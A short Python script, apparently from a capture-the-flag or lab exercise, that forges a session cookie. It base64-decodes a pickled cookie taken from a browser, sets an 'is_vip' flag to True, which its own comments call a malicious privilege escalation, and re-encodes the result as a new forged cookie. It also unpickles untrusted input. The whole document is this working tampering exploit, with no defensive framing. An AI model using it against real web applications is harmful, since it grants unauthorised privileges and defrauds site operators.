import base64
import pickle

# The original cookie as extracted from the browser
cookie_value = "PASTE_THE_COOKIE_HERE"

# Decoding and deserializing the data
raw = base64.urlsafe_b64decode(cookie_value.encode())
session = pickle.loads(raw)

# Injecting the malicious change (Privilege Escalation)
session["is_vip"] = True

# Re-serializing and encoding the modified payload
new_raw = pickle.dumps(session, protocol=pickle.HIGHEST_PROTOCOL)
new_cookie = base64.urlsafe_b64encode(new_raw).decode()

print(new_cookie)  # The new forged cookie
